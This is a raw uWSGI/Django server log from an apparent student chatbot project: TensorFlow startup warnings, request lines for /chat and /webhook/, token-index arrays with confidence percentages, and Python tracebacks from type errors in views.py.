2020-10-23 05:58:00.802965: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
[pid: 1988|app: 0|req: 1/1] 220.68.167.158 () {50 vars in 862 bytes} [Fri Oct 23 05:57:46 2020] GET / => generated 1365 bytes in 14611 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
Not Found: /favicon.ico
[pid: 1988|app: 0|req: 2/2] 220.68.167.158 () {48 vars in 780 bytes} [Fri Oct 23 05:58:01 2020] GET /favicon.ico => generated 2328 bytes in 7 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 0)
*** Starting uWSGI 2.0.18 (64bit) on [Sun Oct 25 06:04:44 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.4.0-1028-aws #29~18.04.1-Ubuntu SMP Tue Oct 6 17:14:23 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Oct  8 2020, 12:12:24)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x55bc0a800cf0
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x55bc0a800cf0 pid: 1924 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 1924, cores: 1)
2020-10-25 06:04:57.692784: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcudart.so.10.1'; dlerror: libcudart.so.10.1: cannot open shared object file: No such file or directory
2020-10-25 06:04:57.692825: I tensorflow/stream_executor/cuda/cudart_stub.cc:29] Ignore above cudart dlerror if you do not have a GPU set up on your machine.


2020-10-25 06:05:10.232622: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcuda.so.1'; dlerror: libcuda.so.1: cannot open shared object file: No such file or directory
2020-10-25 06:05:10.232649: W tensorflow/stream_executor/cuda/cuda_driver.cc:312] failed call to cuInit: UNKNOWN ERROR (303)
2020-10-25 06:05:10.232667: I tensorflow/stream_executor/cuda/cuda_diagnostics.cc:156] kernel driver does not appear to be running on this host (ip-172-31-43-194): /proc/driver/nvidia/version does not exist
2020-10-25 06:05:10.232919: I tensorflow/core/platform/cpu_feature_guard.cc:142] This TensorFlow binary is optimized with oneAPI Deep Neural Network Library (oneDNN) to use the following CPU instructions in performance-critical operations:  AVX2 FMA
To enable them in other operations, rebuild TensorFlow with the appropriate compiler flags.
2020-10-25 06:05:10.276960: I tensorflow/core/platform/profile_utils/cpu_utils.cc:104] CPU Frequency: 2199920000 Hz
2020-10-25 06:05:10.277366: I tensorflow/compiler/xla/service/service.cc:168] XLA service 0x55bc0f6ebff0 initialized for platform Host (this does not guarantee that XLA will be used). Devices:
2020-10-25 06:05:10.277385: I tensorflow/compiler/xla/service/service.cc:176]   StreamExecutor device (0): Host, Default Version
2020-10-25 06:05:10.688264: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-10-25 06:05:10.689812: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-10-25 06:05:10.691207: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
[pid: 1924|app: 0|req: 1/1] 121.171.33.70 () {50 vars in 860 bytes} [Sun Oct 25 06:04:56 2020] GET / => generated 1365 bytes in 14982 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
Not Found: /favicon.ico
[pid: 1924|app: 0|req: 2/2] 121.171.33.70 () {48 vars in 778 bytes} [Sun Oct 25 06:05:11 2020] GET /favicon.ico => generated 2328 bytes in 6 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 0)
*** Starting uWSGI 2.0.18 (64bit) on [Sun Oct 25 06:06:49 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.4.0-1028-aws #29~18.04.1-Ubuntu SMP Tue Oct 6 17:14:23 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Oct  8 2020, 12:12:24)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x558d27addcf0
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x558d27addcf0 pid: 2310 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 2310, cores: 1)
2020-10-25 06:06:54.047673: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcudart.so.10.1'; dlerror: libcudart.so.10.1: cannot open shared object file: No such file or directory
2020-10-25 06:06:54.047707: I tensorflow/stream_executor/cuda/cudart_stub.cc:29] Ignore above cudart dlerror if you do not have a GPU set up on your machine.


2020-10-25 06:07:02.475479: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcuda.so.1'; dlerror: libcuda.so.1: cannot open shared object file: No such file or directory
2020-10-25 06:07:02.475512: W tensorflow/stream_executor/cuda/cuda_driver.cc:312] failed call to cuInit: UNKNOWN ERROR (303)
2020-10-25 06:07:02.475531: I tensorflow/stream_executor/cuda/cuda_diagnostics.cc:156] kernel driver does not appear to be running on this host (ip-172-31-43-194): /proc/driver/nvidia/version does not exist
2020-10-25 06:07:02.475745: I tensorflow/core/platform/cpu_feature_guard.cc:142] This TensorFlow binary is optimized with oneAPI Deep Neural Network Library (oneDNN) to use the following CPU instructions in performance-critical operations:  AVX2 FMA
To enable them in other operations, rebuild TensorFlow with the appropriate compiler flags.
2020-10-25 06:07:02.500944: I tensorflow/core/platform/profile_utils/cpu_utils.cc:104] CPU Frequency: 2199920000 Hz
2020-10-25 06:07:02.501332: I tensorflow/compiler/xla/service/service.cc:168] XLA service 0x558d2c9c9d70 initialized for platform Host (this does not guarantee that XLA will be used). Devices:
2020-10-25 06:07:02.501348: I tensorflow/compiler/xla/service/service.cc:176]   StreamExecutor device (0): Host, Default Version
2020-10-25 06:07:02.790651: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-10-25 06:07:02.792094: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-10-25 06:07:02.793484: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
[pid: 2310|app: 0|req: 1/1] 121.171.33.70 () {52 vars in 891 bytes} [Sun Oct 25 06:06:53 2020] GET / => generated 1263 bytes in 9523 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 2310|app: 0|req: 2/2] 121.171.33.70 () {52 vars in 913 bytes} [Sun Oct 25 06:22:39 2020] GET /chat => generated 0 bytes in 1 msecs (HTTP/1.1 301) 4 headers in 144 bytes (1 switches on core 0)
[pid: 2310|app: 0|req: 3/3] 121.171.33.70 () {52 vars in 915 bytes} [Sun Oct 25 06:22:39 2020] GET /chat/ => generated 1476 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
['', '', '', '']
['', '', '', '']
[[31, 441, 297, 8]]
[[  0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0
    0   0   0   0   0   0   0   0  31 441 297   8]]
2020-10-25 06:23:18.024829: I tensorflow/compiler/mlir/mlir_graph_optimization_pass.cc:118] None of the MLIR optimization passes are enabled (registered 1)
2020-10-25 06:23:18.376658: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-10-25 06:23:18.378144: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-10-25 06:23:18.379553: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
94.78%   .

Internal Server Error: /webhook/
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 115, in _get_response
    response = self.process_exception_by_middleware(e, request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 113, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
  File "/usr/local/lib/python3.6/dist-packages/django/views/decorators/csrf.py", line 54, in wrapped_view
    return view_func(*args, **kwargs)
  File "./haniumapp/views.py", line 49, in webhook
    return start(queryText)
  File "./haniumapp/views.py", line 82, in start
    sum+=int(score)
TypeError: unsupported operand type(s) for +=: 'NoneType' and 'int'
[pid: 2310|app: 0|req: 4/4] 66.249.83.203 () {42 vars in 543 bytes} [Sun Oct 25 06:23:13 2020] POST /webhook/ => generated 67901 bytes in 5342 msecs (HTTP/1.1 500) 5 headers in 156 bytes (1 switches on core 0)
['', '', '', '']
['', '', '', '']
[[31, 441, 297, 8]]
[[  0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0
    0   0   0   0   0   0   0   0  31 441 297   8]]
94.78%   .

Internal Server Error: /webhook/
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 115, in _get_response
    response = self.process_exception_by_middleware(e, request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 113, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
  File "/usr/local/lib/python3.6/dist-packages/django/views/decorators/csrf.py", line 54, in wrapped_view
    return view_func(*args, **kwargs)
  File "./haniumapp/views.py", line 49, in webhook
    return start(queryText)
  File "./haniumapp/views.py", line 82, in start
    sum+=int(score)
TypeError: unsupported operand type(s) for +=: 'NoneType' and 'int'
[pid: 2310|app: 0|req: 5/5] 66.249.83.205 () {42 vars in 543 bytes} [Sun Oct 25 06:23:22 2020] POST /webhook/ => generated 67901 bytes in 99 msecs (HTTP/1.1 500) 5 headers in 156 bytes (1 switches on core 0)
*** Starting uWSGI 2.0.18 (64bit) on [Sun Oct 25 06:24:14 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.4.0-1028-aws #29~18.04.1-Ubuntu SMP Tue Oct 6 17:14:23 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Oct  8 2020, 12:12:24)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x556c25385cf0
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x556c25385cf0 pid: 2514 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 2514, cores: 1)
2020-10-25 06:24:38.111911: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcudart.so.10.1'; dlerror: libcudart.so.10.1: cannot open shared object file: No such file or directory
2020-10-25 06:24:38.111944: I tensorflow/stream_executor/cuda/cudart_stub.cc:29] Ignore above cudart dlerror if you do not have a GPU set up on your machine.


2020-10-25 06:24:46.459296: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcuda.so.1'; dlerror: libcuda.so.1: cannot open shared object file: No such file or directory
2020-10-25 06:24:46.459326: W tensorflow/stream_executor/cuda/cuda_driver.cc:312] failed call to cuInit: UNKNOWN ERROR (303)
2020-10-25 06:24:46.459342: I tensorflow/stream_executor/cuda/cuda_diagnostics.cc:156] kernel driver does not appear to be running on this host (ip-172-31-43-194): /proc/driver/nvidia/version does not exist
2020-10-25 06:24:46.459563: I tensorflow/core/platform/cpu_feature_guard.cc:142] This TensorFlow binary is optimized with oneAPI Deep Neural Network Library (oneDNN) to use the following CPU instructions in performance-critical operations:  AVX2 FMA
To enable them in other operations, rebuild TensorFlow with the appropriate compiler flags.
2020-10-25 06:24:46.484973: I tensorflow/core/platform/profile_utils/cpu_utils.cc:104] CPU Frequency: 2199920000 Hz
2020-10-25 06:24:46.485343: I tensorflow/compiler/xla/service/service.cc:168] XLA service 0x556c2a2815d0 initialized for platform Host (this does not guarantee that XLA will be used). Devices:
2020-10-25 06:24:46.485361: I tensorflow/compiler/xla/service/service.cc:176]   StreamExecutor device (0): Host, Default Version
2020-10-25 06:24:46.771991: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-10-25 06:24:46.773440: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-10-25 06:24:46.774796: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
[pid: 2514|app: 0|req: 1/1] 121.171.33.70 () {52 vars in 910 bytes} [Sun Oct 25 06:24:37 2020] GET / => generated 1263 bytes in 9440 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 2514|app: 0|req: 2/2] 121.171.33.70 () {52 vars in 915 bytes} [Sun Oct 25 06:25:03 2020] GET /chat/ => generated 1476 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
['', '', '', '']
['', '', '', '']
[[31, 441, 297, 8]]
[[  0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0
    0   0   0   0   0   0   0   0  31 441 297   8]]
2020-10-25 06:25:14.816353: I tensorflow/compiler/mlir/mlir_graph_optimization_pass.cc:118] None of the MLIR optimization passes are enabled (registered 1)
2020-10-25 06:25:15.122020: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-10-25 06:25:15.123482: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-10-25 06:25:15.124899: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
94.78%   .

[pid: 2514|app: 0|req: 3/3] 66.249.83.205 () {42 vars in 543 bytes} [Sun Oct 25 06:25:09 2020] POST /webhook/ => generated 79 bytes in 5285 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
['', '', '', '']
['', '', '', '']
[[31, 441, 297, 8]]
[[  0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0
    0   0   0   0   0   0   0   0  31 441 297   8]]
94.78%   .

[pid: 2514|app: 0|req: 4/4] 66.249.83.201 () {42 vars in 543 bytes} [Sun Oct 25 06:25:24 2020] POST /webhook/ => generated 79 bytes in 56 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
['', '', '', '']
['', '', '', '']
[[31, 441, 297, 8]]
[[  0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0
    0   0   0   0   0   0   0   0  31 441 297   8]]
94.78%   .

[pid: 2514|app: 0|req: 5/5] 66.249.83.205 () {42 vars in 543 bytes} [Sun Oct 25 06:25:38 2020] POST /webhook/ => generated 79 bytes in 55 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
['', '', '', '']
['', '', '', '']
[[31, 9, 297, 8]]
[[  0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0
    0   0   0   0   0   0   0   0  31   9 297   8]]
88.71%   .

[pid: 2514|app: 0|req: 6/6] 66.249.83.203 () {42 vars in 543 bytes} [Sun Oct 25 06:25:45 2020] POST /webhook/ => generated 79 bytes in 51 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
['', '']
['', '']
[[9977, 116]]
[[   0    0    0    0    0    0    0    0    0    0    0    0    0    0
     0    0    0    0    0    0    0    0    0    0    0    0    0    0
  9977  116]]
85.63%   .

Internal Server Error: /webhook/
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 115, in _get_response
    response = self.process_exception_by_middleware(e, request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 113, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
  File "/usr/local/lib/python3.6/dist-packages/django/views/decorators/csrf.py", line 54, in wrapped_view
    return view_func(*args, **kwargs)
  File "./haniumapp/views.py", line 49, in webhook
    return start(queryText)
  File "./haniumapp/views.py", line 73, in start
    'fulfillmentText' : '  '+sum+''
TypeError: must be str, not int
[pid: 2514|app: 0|req: 7/7] 66.249.83.201 () {42 vars in 541 bytes} [Sun Oct 25 06:25:49 2020] POST /webhook/ => generated 67826 bytes in 106 msecs (HTTP/1.1 500) 5 headers in 156 bytes (1 switches on core 0)
*** Starting uWSGI 2.0.18 (64bit) on [Sun Oct 25 06:26:45 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.4.0-1028-aws #29~18.04.1-Ubuntu SMP Tue Oct 6 17:14:23 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Oct  8 2020, 12:12:24)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x562a39604cf0
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x562a39604cf0 pid: 2770 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 2770, cores: 1)
2020-10-25 06:27:09.991443: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcudart.so.10.1'; dlerror: libcudart.so.10.1: cannot open shared object file: No such file or directory
2020-10-25 06:27:09.991477: I tensorflow/stream_executor/cuda/cudart_stub.cc:29] Ignore above cudart dlerror if you do not have a GPU set up on your machine.


2020-10-25 06:27:18.376162: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcuda.so.1'; dlerror: libcuda.so.1: cannot open shared object file: No such file or directory
2020-10-25 06:27:18.376196: W tensorflow/stream_executor/cuda/cuda_driver.cc:312] failed call to cuInit: UNKNOWN ERROR (303)
2020-10-25 06:27:18.376212: I tensorflow/stream_executor/cuda/cuda_diagnostics.cc:156] kernel driver does not appear to be running on this host (ip-172-31-43-194): /proc/driver/nvidia/version does not exist
2020-10-25 06:27:18.376423: I tensorflow/core/platform/cpu_feature_guard.cc:142] This TensorFlow binary is optimized with oneAPI Deep Neural Network Library (oneDNN) to use the following CPU instructions in performance-critical operations:  AVX2 FMA
To enable them in other operations, rebuild TensorFlow with the appropriate compiler flags.
2020-10-25 06:27:18.400967: I tensorflow/core/platform/profile_utils/cpu_utils.cc:104] CPU Frequency: 2199920000 Hz
2020-10-25 06:27:18.401351: I tensorflow/compiler/xla/service/service.cc:168] XLA service 0x562a3e4f88e0 initialized for platform Host (this does not guarantee that XLA will be used). Devices:
2020-10-25 06:27:18.401371: I tensorflow/compiler/xla/service/service.cc:176]   StreamExecutor device (0): Host, Default Version
2020-10-25 06:27:18.690920: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-10-25 06:27:18.692341: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-10-25 06:27:18.693746: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
[pid: 2770|app: 0|req: 1/1] 121.171.33.70 () {52 vars in 910 bytes} [Sun Oct 25 06:27:09 2020] GET / => generated 1263 bytes in 9480 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 2770|app: 0|req: 2/2] 121.171.33.70 () {52 vars in 915 bytes} [Sun Oct 25 06:27:46 2020] GET /chat/ => generated 1476 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
['', '', '', '']
['', '', '', '']
[[31, 441, 297, 8]]
[[  0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0
    0   0   0   0   0   0   0   0  31 441 297   8]]
2020-10-25 06:27:56.926613: I tensorflow/compiler/mlir/mlir_graph_optimization_pass.cc:118] None of the MLIR optimization passes are enabled (registered 1)
2020-10-25 06:27:57.231866: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-10-25 06:27:57.233369: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-10-25 06:27:57.234800: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
94.78%   .

[pid: 2770|app: 0|req: 3/3] 66.249.83.201 () {42 vars in 543 bytes} [Sun Oct 25 06:27:51 2020] POST /webhook/ => generated 79 bytes in 5405 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
['', '', '', '']
['', '', '', '']
[[31, 441, 297, 8]]
[[  0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0
    0   0   0   0   0   0   0   0  31 441 297   8]]
94.78%   .

[pid: 2770|app: 0|req: 4/4] 66.249.83.201 () {42 vars in 543 bytes} [Sun Oct 25 06:28:39 2020] POST /webhook/ => generated 79 bytes in 55 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
['', '', '', '', '', '', '']
['', '', '', '', '', '']
[[31, 441, 898, 22, 14198, 5279]]
[[    0     0     0     0     0     0     0     0     0     0     0     0
      0     0     0     0     0     0     0     0     0     0     0     0
     31   441   898    22 14198  5279]]
50.77%   .

[pid: 2770|app: 0|req: 5/5] 66.249.83.201 () {42 vars in 543 bytes} [Sun Oct 25 06:28:55 2020] POST /webhook/ => generated 79 bytes in 70 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
['', '']
['', '']
[[51, 261]]
[[  0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0
    0   0   0   0   0   0   0   0   0   0  51 261]]
97.87%   .

[pid: 2770|app: 0|req: 6/6] 66.249.83.205 () {42 vars in 541 bytes} [Sun Oct 25 06:29:10 2020] POST /webhook/ => generated 79 bytes in 48 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
['', '', '', '?']
['', '', '', '?']
[[1909, 297, 8, 1]]
[[   0    0    0    0    0    0    0    0    0    0    0    0    0    0
